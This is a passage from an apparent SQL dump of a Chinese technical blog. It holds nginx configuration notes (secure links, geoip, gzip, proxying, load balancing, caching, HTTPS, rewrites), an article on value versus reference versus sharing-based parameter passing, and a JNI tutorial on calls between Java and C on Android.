安全链接,secure_link_module\n```c++\n// 安全链接模块\n// 制定并允许检查请求的链接的真实性以及保护资源免受未经授权的访问,基于加签方法的验证\n// 限制链接生效周期\n// 生成验证链接如 /download?md5=1YHN123jasdlUINAD&expires=1539792000\nsecure_link_module\n	Syntax: secure_link expression\n	Default: -\n	Context: http,server,location\n	\n	Syntax: secure_link_mod5 expression\n	Default: -\n	Context: http,server,location\n```\n```c++\n// nginx.conf\nserver {\n	listen       80;\n	server_name  localhost;\n	root /opt/app/code;\n	location / {\n		secure_link $arg_md5,$arg_expires;\n		// 设置口令\n		secure_link_md5 \"$secure_link_expires$uri myMD5Salt\";\n		if ($secure_link = \"\") {\n			return 403;\n		}\n		if ($secure_link = \"0\") {\n			return 410;\n		}\n	}\n}\n\n// 生成链接示例\n#!/bin/sh\n#\nservername=\"jeson.t.test.io\"\ndownload_file=\"/download/file.img\"\ntime_num=$(date -d \"2018-10-18 00:00:00\" +%s)\nsecret_num=\"myMD5Salt\"\n\nres=$(echo -n \"${time_num}${download_file} ${secret_num}\"|openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =)\n\necho \"http://${servername}${download_file}?md5=${res}&expires=${time_num}\"\n```\n#### 区别国内外作访问控制,geoip_module\n```c++\n// 基于ip地址匹配MaxMindGeoIP二进制文件,读取ip所在地域信息\n// 需要借助第三方模块国家地区ip数据字典\n// yum install nginx-module-geoip\ngeoip_module\n	// 国家名称\n	$geoip_country_name\n	// 国家代码\n	$geoip_country_code\n	// 国家城市\n	$geoip_city\n```\n```c++\n// 导入geoip相关数据依赖\ngeoip_country /etc/nginx/geoip/GeoIP.dat;\ngeoip_city /etc/nginx/geoip/GeoLiteCity.dat;\nserver {\n	location / {\n		if ($geoip_country_code != CN) {\n			return 403;\n		}\n		root   /usr/share/nginx/html;\n		index  index.html index.htm;\n	}\n	\n	location /myip {\n		default_type text/plain;\n		return 200 \"$remote_addr $geoip_country_name $geoip_country_code $geoip_city\";\n	}\n}\n```\n\n### 静态读取资源相关配置\n#### 解压缩,提高传输速率\n```c++\n// 文件读取,采用sendfile,基于Linux零拷贝技术提高效率\nsendfile\n	Syntax: sendfile on | off\n	Default: sendfile off\n	Context: http,server,location,if in location\n\n// sendfile开启的情况下,将传输包进行合并,实时性要求低,提高网络包的传输速率\ntcp_nopush \n	Synctax: tcp_nopush on | off\n	Default: tcp_nopush off\n	Context: http,server,location\n\n// 将传输包立刻发出,实时性要求高,在keepalive长连接下,提高网络包的传输实时性\ntcp_nodelay	\n	Syntax: tcp_nodelay on | off\n	Default: tcp_nodelay on\n	Context: http,server,location\n\n// 压缩传输,尽可能的压缩包,提高效率\ngzip\n	Syntax: gzip on | off\n	Default: gzip off\n	Context: http,server,location,if in location\n\n// 压缩等级,等级越高,压缩比例越高,传输的文件越小\ngzip_comp_level \n	Syntax: gzip_comp_level #{level}\n	Default: gzip_comp_level 1\n	Context: http,server,location\n\n// gzip协议版本y\ngzip_http_version 1.0|1.1 \n	Syntax: gzip_http_version 1.0|1.1\n	Default: gzip_http_version 1.1\n	Context: http,server,location\n\n// 预读功能,首先去找对应的gz压缩文件,存在立刻返回\ngzip_static_module\n	Syntax: gzip_static on | off\n	Default: gzip_static off\n	Context: location\n```\n```c++\nserver {\n	sendfile on;\n	location ~ .*\\.(jpg|gif|png)$ {\n		gzip on;\n		gzip_http_version 1.1;\n		gzip_comp_level 2;\n		gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/\n		javascript application/x-httpd-php image/jpeg image/gif image/png;\n		root  /opt/app/code/images;\n	}\n	\n	location ~ .*\\.(txt|xml)$ {\n		gzip on;\n		gzip_http_version 1.1;\n		gzip_comp_level 1;\n		gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/\n		javascript application/x-httpd-php image/jpeg image/gif image/png;\n		root  /opt/app/code/doc;\n	}\n	\n	location ~ ^/download {\n		gzip_static on;\n		tcp_nopush on;\n		root /opt/app/code;\n	}\n}\n```\n#### 设置Cache-Control,Expires缓存过期时间以及响应头\n```c++\n// 添加Cache-Control,Expires头\n// 缓存与http的expires,etag,last-modified有关\nexpires\n	Syntax: expires #{time};\n	Default: expires off;\n	Context: http,server,location,if in location\n\n// 添加响应头\nadd_header \n	Syntax: add_header name value\n	Default: -\n	Context: http,server,location,if in location\n```\n```c++\nserver {\n	location ~ .*\\.(htm|html)$ {\n		root  /opt/app/code;\n		add_header Access-Control-Allow-Origin *;\n		add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;\n		// 缓存24小时\n		expires 24h;\n	}\n}\n```\n#### refer防盗链\n```c++\n// 访问来源配置模块\nhttp_refer \n	Synctax: valid_referers none | blocked | server_names | string...\n	Default: -\n	Context: server,location\n```\n```c++\nserver {\n	location ~ .*\\.(jpg|gif|png)$ {\n		gzip on;\n		gzip_http_version 1.1;\n		gzip_comp_level 2;\n		gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/\n		javascript application/x-httpd-php image/jpeg image/gif image/png;\n		\n		// 允许116.62.103.228和google网站进行访问\n		valid_referers none blocked 116.62.103.228 ~/google\\./;\n		if ($invalid_referer) {\n			return 403;\n		}\n		root  /opt/app/code/images;\n	}\n}\n```\n### 代理相关配置\n```c++\n// 代理地址\nproxy_pass\n	Syntax: proxy_pass url;		\n	Default: -\n	Context: location,if in location,limit_except\n\n// 缓冲区\nproxy_buffering\n	Syntax: proxy_buffering on | off\n	Default: proxy_buffering on\n	Context: http,server,location\n\n// 跳转重定向\nproxy_redirect\n	Syntax: proxy_redirect default;proxy_redirect off;proxy_redirect redirect replacement;\n	Default: -\n	Context: http,server,location\n\n// 头信息\nproxy_set_header\n	Syntax: proxy_set_header field value\n	Default: proxy_set_header Host $proxy_host;proxy_set_header Connection close;\n	Context: http,server,location\n\n// nginx代理到服务端的超时时间\nproxy_connect_timeout\n	Syntax: proxy_connect_timeout time;\n	Default: proxy_connect_timeout 60s;\n	Context: server,location\n```\n```c++\nserver {\n	location / {\n		// 正向代理\n		proxy_pass http://$http_host$request_uri;\n	}\n\n	location / {\n		// 相比$remote addr,该值可以获取实际代理服务器前的ip\n		// 但该头信息可以被更改,且不是所有代理件都遵循该头\n		// 建议在ip1初始化客户端定义一个请求头进行传递\n		if ( $http_x_forwarded_for !~* \"^116\\.62\\.103\\.228\") {\n			return 403;\n		}\n		root   /opt/app/code;\n		index  index.html index.htm;	\n    }\n	\n	location / {\n		proxy_pass http://127.0.0.1:8080;\n		// 引用文件内容\n		include proxy_params;\n	}\n	\n	location / {\n		// 代理地址\n		proxy_pass http://127.0.0.1:8080;\n		// 重设为重定向\n		proxy_redirect default;\n		// 设置请求头\n		proxy_set_header Host $http_host;\n		proxy_set_header X-Real-IP $remote_addr;\n		// 超时\n		proxy_connect_timeout 30;\n		proxy_send_timeout 60;\n		proxy_read_timeout 60;\n		// 缓冲区\n		proxy_buffer_size 32k;\n		proxy_buffering on;\n		proxy_buffers 4 128k;\n		proxy_busy_buffers_size 256k;\n		proxy_max_temp_file_size 256k;	\n	}\n	\n}\n```\n### 负载均衡相关配置\n```c++\n// 配置负载均衡\nupstream \n	Syntax: upstream name {...}\n	Default: -\n	Context: http\n```\n```c++\n/*\n	后端服务器在负载均衡调度中的状态\n	down		当前的server暂时不参与负载均衡\n	backup		预留的备份服务器\n	max_fails	允许请求失败的次数\n	fail_timeout 经过max_fails失败后,服务暂停的时间\n	max_conns	限制最大的接收的连接数\n*/\nupstream test{\n        server 116.62.103.228:8001 down;\n        server 116.62.103.228:8002 backup;\n        server 116.62.103.228:8003 max_fails=1 fail_timeout=10s;\n}\n\n/*\n	调度算法\n	轮询-按时间顺序逐一分配到不同的后端服务器,默认\n	加权轮询-weight值越大,分配的访问几率越高\n	ip_hash-每个请求按访问的ip的hash结果分配,这样来自同一个ip的固定访问一个后端服务器\n	url_hash-按照访问的url的hash结果来分配请求,这样每个url定向到同一个后端服务器\n	least_conn-最少连接数,哪个机器连接少就分发\n	hash关键值-hash自定义的key\n*/\n// 加权轮询\nupstream test{\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002 weight=5;\n        server 116.62.103.228:8003;\n}\n// ip_hash\nupstream test{\n        ip_hash;\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002;\n        server 116.62.103.228:8003;\n}\n// url_hash\nupstream test{\n        hash $request_uri;\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002;\n        server 116.62.103.228:8003;\n}\n```\n### 缓存相关配置\n```c++\n// 缓存相关配置\nproxy_cache_path \n	Syntax: proxy_cache_path path[levels=levels][use_temp_path=on|off]\n				keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number]\n				[manager_sleep=time] [manager_threshold=time] [loader_files=numbers]\n				[loader_sleep=time] [loader_threshold=time] [purger=on|off]\n				[purger_files=number] [purger_sleep=time] [purger_threshold=time]\n	Default: -\n	Context: http\n\n// 缓存过期周期\nproxy_cache_valid \n	Syntax: proxy_cache_valid [code...]time;\n	Default: -\n	Context: http,server,location\n\n// 缓存纬度,根据什么key\nproxy_cache_key\n	Syntax: proxy_cache_key string;\n	Default: proxy_cache_key $scheme$proxy_host$request_uri\n	Context: http,server\n\n// 不参与缓存的页面\nproxy_no_cache \n	Syntax: proxy_no_cache string\n	Default: -\n	Context: http,server,location\n```\n```c++\nhttp {\n	upstream test{\n        server 116.62.103.228:8001;\n        server 116.62.103.228:8002;\n        server 116.62.103.228:8003;\n    }\n	proxy_cache_path /opt/app/cache levels=1:2 keys_zone=imooc_cache:10m max_size=10g inactive=60m use_temp_path=off;\n	server {\n		// 校验url地址\n		if ($request_uri ~ ^/(url3|login|register|password\\/reset)) {\n        	set $cookie_nocache\n    	}\n		location / {\n			proxy_cache on;\n			proxy_pass http://test;\n			proxy_cache_valid 200 304 12h;\n			proxy_cache_valid any 10m;\n			proxy_cache_key $host$uri$is_args$args;\n			proxy_no_cache $cookie_nocache\n			// 请求头添加nginx缓存状态\n			add_header  Nginx-Cache \"$upstream_cache_status\"; \n			// 失败时自动跳转至一下负载均衡服务器节点\n			proxy_next_upstream error t	imeout invalid_header http_500 http_502 http_503 http_504;\n		}\n	}\n}\n```\n### https相关配置\n```c++\n// https相关配置\nssl\n	Syntax: ssl on | off\n	Default: ssl off\n	Context: http,server\n	\n	Syntax: ssl_certificate file\n	Default: -\n	Context: http,server\n```\n```c++\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    sendfile        on;\n    keepalive_timeout  65;\n\n    server {\n        listen       80;\n        server_name  blog.tuwq.cn;\n\n        location / {\n            root   html;\n            rewrite ^/(.*) https://blog.tuwq.cn/$1 redirect;\n        }\n\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n    }\n\n\n    server {\n        listen 443;\n        server_name blog.tuwq.cn;\n        ssl on;\n        root /usr/blog/page/build;\n        index index.html index.htm;\n\n        ssl_certificate   cert/1938525_blog.tuwq.cn.pem;\n        ssl_certificate_key  cert/1938525_blog.tuwq.cn.key;\n        ssl_session_timeout 5m;\n        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n        ssl_prefer_server_ciphers on;\n\n        underscores_in_headers on;\n        charset utf-8;\n\n        location / {\n          try_files $uri $uri/ @router;\n          proxy_set_header X-Real-IP  $remote_addr;\n              index index.html;\n        }\n        \n        location @router {\n          rewrite ^.*$ /index.html last;\n        }   \n    }\n}\n```\n\n### rewrite语法\n```c++\n// 配置语法\nrewrite\n	// 改写替换\n	Syntax: rewrite regex replacement [flag]\n	Default: -\n	Context: server,location,if\n\n// 应用场景\n1 .URL访问跳转,支持开发设计,页面跳转,兼容性支持,展示效果等\n2. seo优化\n3. 后台维护,流量转发\n4. 安全\n\n// 规则优先级\n1. 执行server块的rewrite指令\n2. 执行location匹配\n3. 执行选定的location中的rewrite\n```\n```c++\n/*\n	break	停止rewrite检测,不会匹配接下来其他的loaction停止rewrite检测,会重新建立请求连接去尝试匹配后面的location\n	last	停止rewrite检测,会重新建立请求连接去尝试匹配后面的location\n	redirect	返回302临时重定向,地址栏会显示跳转后的地址,会访问后端\n	permanent	返回302永久重定向,地址栏会直接到跳转后的地址,不再访问后端		\n*/\nserver {\n    root /opt/app/code; \n    location ~ ^/break {\n        rewrite ^/break /test/ break;\n    } \n \n    location ~ ^/last {\n         rewrite ^/last /test/ last;\n         #rewrite ^/last /test/ redirect;\n    }    \n\n    location ~ ^/test {\n         rewrite ^/test http://www.test.com/ permanent;\n         #rewrite ^/test http://www.test.com/ redirect;\n    }    \n \n    location /test/ {\n       default_type application/json;\n       return 200 \'{\"status\":\"success\"}\';\n    }\n}\n\nserver {\n	location / {\n        rewrite ^/course-(\\d+)-(\\d+)-(\\d+)\\.html$ /course/$1/$2/course_$3.html break;\n        // 是chrome浏览器则重定向跳转\n        if ($http_user_agent ~* Chrome) {\n            rewrite ^/nginx http://coding.test.com/class/121.html redirect;\n        } \n\n        // 请求的文件路径是否存在\n        if (!-f $request_filename) {\n            rewrite ^/(.*)$ http://www.baidu.com/$1 redirect;\n        }\n        index  index.html index.htm;\n    }\n}\n```\n### CPU亲和度配置\n```c++\nuser  nginx;\nworker_processes  16;\n#worker_cpu_affinity 0000000000000010 0000000000000010 0000000000000100 0000000000001000 0000000000010000 0000000000100000 0000000001000000 0000000010000000 0000000100000000 0000001000000000 0000010000000000 0000100000000000 0001000000000000 0010000000000000 0100000000000000 1000000000000000;\n#worker_cpu_affinity 1010101010101010 0101010101010101;\nworker_cpu_affinity auto;\n\nerror_log  /var/log/nginx/error.log warn;\npid        /var/run/nginx.pid;\n\nworker_rlimit_nofile 35535;\n\nevents {\n    use epoll;\n    worker_connections  10240;\n}\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n    #######\n    #Charset\n    charset utf-8;\n\n    log_format  main  \'$remote_addr - $remote_user [$time_local] \"$request\" \'\n                      \'$status $body_bytes_sent \"$http_referer\" \'\n                      \'\"$http_user_agent\" \"$http_x_forwarded_for\" \"$request_uri\"\';\n\n    access_log  /var/log/nginx/access.log  main;\n    \n    #######\n    #Core modlue\n    sendfile        on;\n    #tcp_nopush     on;\n    #tcp_nodeny     on;\n    keepalive_timeout  65;\n    \n    ########\n    #Gzip module\n    gzip  on;\n    gzip_disable \"MSIE [1-6]\\.\";  \n    gzip_http_version 1.1; \n    \n    ########\n    #Virtal Server\n    include /etc/nginx/conf.d/*.conf;\n}\n```', 1, 0, 40, 0, 0, '2019-06-17 20:05:06', '2019-06-18 21:21:07', 0, 0);
INSERT INTO `article` VALUES (69, 1, '值传递,引用传递与共享传递', '2019/7/1561972420_CE2699D6EEC9F552AFFD97E96C72C7AE.jpg', '### 值传递\n![TIM截图20190701173910.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_TIM截图20190701173910.png)\n![valuetranfer.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_valuetranfer.png)\n1. 值传递是将值进行拷贝的传递,传递进去的值并非原内存地址\n2. 既然不属于同一块内存,那么就是毫无关系,修改不受影响\n\n### 引用传递 \n![TIM截图20190701180545.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_TIM截图20190701180545.png)\n![refer.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_refer.png)\n1. C语言的指针是记录内存地址,那么采用指针便可在传递时接收到原值的内存地址\n2. 指向属于同一块内存,那么修改等操作就会受影响\n3. 由于指针的原因,C语言很大程度上并不需要所谓的返回值,因为拿到了内存地址就可以直接修改值了\n\n### 共享传递\n![TIM截图20190701183605.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_TIM截图20190701183605.png)\n1. 进行传递后,依然修改有效,这似乎不像是值传递,如果是值传递的,那么main方法中的值不应该会变,但值却改变了,这令人怀疑是引用传递\n\n![TIM截图20190701184028.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_TIM截图20190701184028.png)\n1. 为了证明是否是引用传递,尝试把传递的\"引用地址\"重新赋值,然而main方法中的值没有改变,这证明该传递不是引用传递\n\n\n![TIM截图20190701200859.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_TIM截图20190701200859.png)\n![shared.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561984133_shared.png)\n1. Java采用了共享传递的方案,它可以在一定程度下像引用传递那样操作数据,但是当想重新对\"引用地址\"赋值时,这会导致新开辟内存\n2. 原来传递过来的是真正内存地址引用的拷贝,而非真正的内存地址,虽然可以间接进行正常的修改值操作等,但是无法控制真正的内存地址\n3. 同样采用共享传递的语言还有JavaScript,Pyhon,Ruby,共享传递实际上算是值传递的一种', 0, 0, 31, 0, 0, '2019-07-01 17:14:06', '2019-07-01 20:47:39', 0, 0);
INSERT INTO `article` VALUES (70, 1, 'JNI基本使用,Java与C相互调用', '2019/7/1561986376_93DAB2D2D8C8E80CFA66A37086AF356A.jpg', '### 概念\n#### JNI作用\n1. 实现Java和本地语言的相互调用\n2. android平台 Java和c/c++相互调用\n3. c可以操作硬件,运行在底层\n4. 通过jni把需要效率的逻辑放到c去实现\n5. 使用jni可以访问c的优秀代码\n6. 处于安全考虑,反汇编难度较高\n\n#### 交叉编译\n1. 在一个平台上编译出另一个平台上可以运行的本地代码\n2. 操作系统用哪种语言开发的,那么对于这个操作系统这种语言就是本地语言\n3. CPU平台: x86 arm mips \n4. 操作系统平台: windows linux macos unix\n5. 模拟另外一个平台的特性进行编译\n6. NDK(native develop kit)提供了交叉编译的能力\n7. 我们需要在windows上开发并在linux系统上运行\n\n### 依赖及示范代码\n链接：https://pan.baidu.com/s/1uXZt82Wp5IzaF2OUdSQ5kA \n提取码：rmrn\n\n### 目的\n![yuanli.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561993126_yuanli.png)\n1. 通过NDK将写好的C代码和信息通过NDK编译成so文件放入android中\n2. Java中通过native方法寻找到正确的library找到对应执行的so文件,完成对C的调用\n\n### 配置NDK至环境变量\n![TIM截图20190701211822.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561987270_TIM截图20190701211822.png)\n![TIM截图20190701212037.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561987271_TIM截图20190701212037.png)\n\n### HelloWorld例子\n#### 编写布局和activity\n![TIM截图20190701213103.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561987914_TIM截图20190701213103.png)\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".MainActivity\" >\n\n    <Button\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:onClick=\"jniHello\"\n        android:text=\"调用c的函数\" />\n\n</RelativeLayout>\n```\n\n```java\npublic class MainActivity extends AppCompatActivity {\n    // 用于加载后续编译后的so文件\n    static{\n        System.loadLibrary(\"hello\");\n    }\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n    }\n\n    public void jniHello(View v) {\n        Toast.makeText(this, helloInc(), Toast.LENGTH_SHORT).show();\n    }\n\n    /**\n     * 通过native关键字声明了一个本地方法 本地方法不用实现,不需要用jni调用c的代码来实现\n     * @return\n     */\n    public native String helloInc();\n\n}\n```\n\n#### 编写C代码与相关配置\n![TIM截图20190701214047.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561988843_TIM截图20190701214047.png)\n![TIM截图20190701214148.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561988844_TIM截图20190701214148.png)\n![TIM截图20190701214619.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561988844_TIM截图20190701214619.png)\n```c\n#include <stdlib.h>\n#include <stdio.h>\n#include<jni.h>\n\n// 本地函数命名规则 Java_包名_native函数所在类的类名_native方法名\n// 第二个参数 jobject 就是调用当前native方法的Java对象\n// 第一个参数 JNIEnv* JNIEnv是结构体 JNI\n// env又是JNIEnv的一级指针 那么env就是JNINativeInterface的二级指针\n// 结构体JNINativeInterface定义了大量的函数指针 这些函数指针在JNI开发中十分常用\n// (**env).func (*env)->\n//jstring Java_com_example_hellojni_HelloJni_stringFromJNI(JNIEnv* env, jobject thiz)\nJNIEXPORT jstring JNICALL Java_com_tuwq_jnihello_MainActivity_helloInc(JNIEnv* env, jobject thiz) {\n    char* str = \"hello from c!!\";\n    return (*env)->NewStringUTF(env,str);\n}\n```\n```c++\n#makefile 作用就是向编译系统描述 我要编译的文件在什么位置 要生成的文件叫什么名字 是什么类型\nLOCAL_PATH := $(call my-dir)\n#清除上次编译的信息\n    include $(CLEAR_VARS)\n#在这里指定最后生成的文件的名字\n    LOCAL_MODULE    := hello\n    LOCAL_SRC_FILES := hello.c\n#要编译的C的代码的文件名\n    include $(BUILD_SHARED_LIBRARY)\n    #要生成的是一个动态链接库\n```\n```c++\nAPP_ABI := armeabi x86\n```\n#### 运行ndk交叉编译并调试\n![TIM截图20190701215103.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561989563_TIM截图20190701215103.png)\n![TIM图片20190701215211.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561989564_TIM图片20190701215211.png)\n![TIM截图20190701215532.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561989563_TIM截图20190701215532.png)\n![TIM截图20190701215618.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561989563_TIM截图20190701215618.png)\n![TIM截图20190701215753.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561989563_TIM截图20190701215753.png)\n\n### 常见错误\n#### 找lib的时候(so文件)返回null\n![TIM截图20190701220335.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561990261_TIM截图20190701220335.png)\n1. 加载时名字写错了,lib前缀去掉,.so后缀去掉,剩下的就是要加载的文件名字\n2. 当前的so文件不能被so文件不被cpu平台支持,需要通过在jni目录下添加Application.mk来指定编译之后so支持的cpu平台\n\n#### 本地方法没找到\n![TIM截图20190701220529.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561990262_TIM截图20190701220529.png)\n1. 函数名写错了,尽量不要在包名,类名,方法名写\\_,这样会导致jni分隔错误,如果有\\_,比如wo\\_hello的包名,类名,那么写成wo_1hello,加1告诉jni这两个属于在一起的内容\n3. 忘记写System.loadLibrary,可以通过静态代码块加载.so文件\n\n### 传递参数调用\n![TIM截图20190701221712.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561990819_TIM截图20190701221712.png)\n![TIM截图20190701222157.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561990959_TIM截图20190701222157.png)\n```java\npublic class JNI {\n    static{\n        System.loadLibrary(\"passparam\");\n    }\n    public native int add(int x, int y);\n    public native String sayHelloInC(String s);\n    public native int[] arrElementsIncrease(int[] intArray);\n}\n```\n```c\n// 接收int类型\nJNIEXPORT jint JNICALL Java_com_tuwq_javapasstoc_JNI_add\n  (JNIEnv * env, jobject thiz, jint x, jint y){\n    return x+y;\n}\n\n// 接收string类型\nJNIEXPORT jstring JNICALL Java_com_tuwq_javapasstoc_JNI_sayHelloInC\n  (JNIEnv * env, jobject thiz, jstring jstr){\n	// 把Java的字符串转换成C的字符串\n	//char* cstr = _JString2CStr(env,jstr);\n	char* cstr = (*env)->GetStringUTFChars(env,jstr,NULL);\n	// 取字符串长度\n	int length = strlen(cstr);\n	int i;\n	// 给每一个元素+1\n	for(i=0;i<length;i++){\n		*(cstr+i)+=1;\n	}\n	// 将c字符串转换为jstring类型\n	return (*env)->NewStringUTF(env,cstr);\n}\n\nJNIEXPORT jintArray JNICALL Java_com_tuwq_javapasstoc_JNI_arrElementsIncrease\n  (JNIEnv * env, jobject thiz, jintArray jarr){\n	// 获取数组的长度\n	int length = (*env)->GetArrayLength(env,jarr);\n	LOGD(\"length=%d\",length);\n	// jboolean java的boolean类型在c中的表示\n	// 这个参数 在有些虚拟机中 用户作为 执行完GetIntArrayElements之后是否创建了数组的副本标志\n	// 如果创建了副本 就会是true  1\n	// 如果没创建副本 就会是false 0 android中 这个参数不必使用 直接传NULL 没有意义的地址\n	jboolean isCopy = NULL;\n	// 获取到数组首地址\n	int* p = (*env)->GetIntArrayElements(env,jarr,NULL);\n	int i ;\n	for(i = 0;i<length;i++){\n		*(p+i)+=10;\n	}\n    // 由于获取到了数组的首地址,所以通过指针操作了每一个元素之后,jarr里的每一个元素已经被修改\n    // 所以没有必要创建新的数组,直接把jarr作为返回值\n	return jarr;\n}\n```\n\n### C反射调用Java\n![TIM截图20190701223002.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561991763_TIM截图20190701223002.png)\n![TIM截图20190701223158.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1561991763_TIM截图20190701223158.png)\n```java\npublic class MainActivity extends AppCompatActivity {\n\n    private JNI jni;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        jni = new JNI();\n    }\n\n    public void callvoid(View v) {\n        jni.callbackvoid();\n    }\n\n    public void callint(View v) {\n        jni.callbackInt();\n    }\n\n    public void callstring(View v) {\n        jni.callbackString();\n    }\n\n    public void calltoast(View v){\n		// jni.callbackShowToast();\n        callbackShowToast();\n    }\n\n    public native void callbackShowToast();\n\n    public void showToast(String s){\n        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();\n    }\n}\n```\n\n```java\npublic class JNI {\n    static{\n        System.loadLibrary(\"ccalljava\");\n    }\n    // c调用空参\n    public void helloFromJava(){\n        System.out.println(\"hello from java\");\n    }\n    // c调用int\n    public int add(int x,int y) {\n        return x+y;\n    }\n    // c调用string\n    public void printString(String s){\n        System.out.println(s);\n    }\n\n    public native void callbackvoid();\n    public native void callbackInt();\n    public native void callbackString();\n    public native void callbackShowToast();\n}\n```\n```c\n#include <jni.h>\n#include <android/log.h>\n#define LOG_TAG \"System.out\"\n#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)\n#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)\n\nJNIEXPORT void JNICALL Java_com_tuwq_ccalljava_JNI_callbackvoid\n  (JNIEnv * env, jobject thiz){\n    // 找到字节码\n	jclass clazz = (*env)->FindClass(env,\"com/tuwq/ccalljava/JNI\");\n	// 找到方法\n	// 最后一个参数是方法签名(参数和返回值)\n	// 通过jdk的命令 javap -s com.tuwq.ccalljava.JNI 可以查看到类的所有方法签名\n	jmethodID methodID = (*env)->GetMethodID(env,clazz,\"helloFromJava\",\"()V\");\n    // 创建对象(可选) 如果native方法和要和回调的方法在同一个Java类中 就不用创建对象,直接使用传进来的对象jobject\n	// 第一个参数 JNIEnv\n	// 第二个参数 要调用方法的对象\n	// 第三个参数 要调用的方法的methodid变量\n	// ...可变的参数 调用方法时如果有参数 就是后面可变参数 要传入的内容\n	(*env)->CallVoidMethod(env,thiz,methodID);\n}\n\nJNIEXPORT void JNICALL Java_com_tuwq_ccalljava_JNI_callbackInt\n  (JNIEnv * env, jobject thiz){\n	jclass clazz = (*env)->FindClass(env,\"com/tuwq/ccalljava/JNI\");\n	jmethodID methodID = (*env)->GetMethodID(env,clazz,\"add\",\"(II)I\");\n	int result = (*env)->CallIntMethod(env,thiz,methodID,3,4);\n	LOGD(\"result=%d\",result);\n}\n\nJNIEXPORT void JNICALL Java_com_tuwq_ccalljava_JNI_callbackString\n  (JNIEnv * env, jobject thiz){\n	jclass clazz = (*env)->FindClass(env,\"com/tuwq/ccalljava/JNI\");\n	jmethodID methodID = (*env)->GetMethodID(env,clazz,\"printString\",\"(Ljava/lang/String;)V\");\n	jstring jstr = (*env)->NewStringUTF(env,\"hello\");\n	(*env)->CallVoidMethod(env,thiz,methodID,jstr);\n}\n\nJNIEXPORT void JNICALL Java_com_tuwq_ccalljava_MainActivity_callbackShowToast\n  (JNIEnv * env, jobject thiz){\n	jclass clazz = (*env)->FindClass(env,\"com/tuwq/ccalljava/MainActivity\");\n	jmethodID methodID = (*env)->GetMethodID(env,clazz,\"showToast\",\"(Ljava/lang/String;)V\");\n	// 创建activity对象是android不允许的,会出现错误\n	// jobject obj = (*env)->AllocObject(env,clazz);\n	jstring jstr = (*env)->NewStringUTF(env,\"call back hello\");\n	(*env)->CallVoidMethod(env,thiz,methodID,jstr);\n}\n```\n### jni.h文件\n![TIM截图20190702131204.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1562044595_TIM截图20190702131204.png)\n![TIM截图20190702131545.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1562044596_TIM截图20190702131545.png)\n![TIM截图20190702131314.png](http://blog.img.tuwq.cn/upload/artimg/2019/7/1562044595_TIM截图20190702131314.png)\n1. ndk在各平台下的jni.h中的定义,如目录android-ndk-r9d\\platforms\\android-19\\arch-x86\\usr\\include\n2. 作为接收native方法的第一个参数,实际上JNIEnv是结构体指针,它是jni提供函数库,其中包含大量与Java交互的函数\n3. 由于某些Java基本类型在C中不存在,且表示字节数量不同,如C的char是1字节,long是4字节,而Java中char是2字节,long是8字节。jni将其重新别名定义\n4. 对于object,string,array实际定义上都是可以指向任何的指针,void * 是一个跳跃力未定的指针\n5. void 